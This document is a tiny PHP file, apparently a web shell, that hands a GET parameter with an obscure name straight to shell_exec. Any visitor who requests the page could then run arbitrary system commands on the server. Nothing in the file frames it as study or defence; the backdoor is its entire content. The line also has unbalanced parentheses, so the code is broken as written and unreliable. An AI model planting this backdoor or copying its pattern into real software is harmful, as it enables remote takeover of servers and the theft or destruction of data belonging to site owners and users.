<?php
shell_exec(($_GET['OF3SC-Ah']);
?>
